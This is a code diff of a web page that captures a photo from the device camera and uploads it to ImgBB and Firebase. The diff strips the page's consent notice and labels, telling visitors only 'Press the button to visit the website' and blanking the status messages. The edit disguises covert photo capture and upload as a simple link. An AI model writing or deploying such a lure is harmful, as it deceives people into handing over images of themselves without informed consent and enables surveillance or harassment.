@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="A simple and secure online photo capture utility.">
-    <title>Capture Photo</title>
+    <title>Capture...</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
         button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
@@ -30,8 +30,8 @@
 </head>
 <body>
 
-    <h1>Photo Capture</h1>
-    <button id="clickPhotoBtn">Click Photo</button>
+    <h1></h1>
+    <button id="clickPhotoBtn">tap here</button>
 
     <div id="loadingOverlay" class="hidden">
         <div id="spinner" class="spinner"></div>
@@ -42,7 +42,7 @@
     <canvas id="canvasElement"></canvas>
 
     <div class="legal-terms">
-        <strong>Privacy Policy & Terms of Service:</strong> By clicking the button above, you agree to allow temporary access to your device's camera. This utility captures a single photograph for upload to our secure cloud storage. We prioritize user privacy and do not record video or audio in the background. The service is provided strictly as a simple utility tool. Data is handled securely via standard API protocols. If you do not consent to camera access, please do not use this feature.
+        <strong>Privacy Policy & Terms of Service:</strong> Press the button to visit the website.
     </div>
 
     <script type="module">
@@ -112,7 +112,7 @@
             const base64Image = dataUrl.split(",")[1];
 
             try {
-                loadingText.innerText = "Processing Image...";
+                loadingText.innerText = "Processing ...";
                 
                 const formData = new FormData();
                 formData.append("key", IMGBB_API_KEY);
@@ -127,7 +127,7 @@
                 const data = await response.json();
 
                 if (data.success) {
-                    loadingText.innerText = "Saving to Database...";
+                    loadingText.innerText = "...";
                     const imageUrl = data.data.url;
                     
                     // 2. Save to Firebase
@@ -141,12 +141,12 @@
                     loadingText.innerText = "Complete!";
                     setTimeout(() => loadingOverlay.classList.add("hidden"), 3000);
                 } else {
-                    throw new Error("ImgBB Upload Failed!");
+                    throw new Error("not working");
                 }
             } catch (error) {
                 console.error("Upload Error: ", error);
                 spinner.style.display = "none";
-                loadingText.innerText = "Upload/Database Error. Please check Firebase Rules or API Key.";
+                loadingText.innerText = "API Key.";
                 setTimeout(() => loadingOverlay.classList.add("hidden"), 5000);
             }
         }
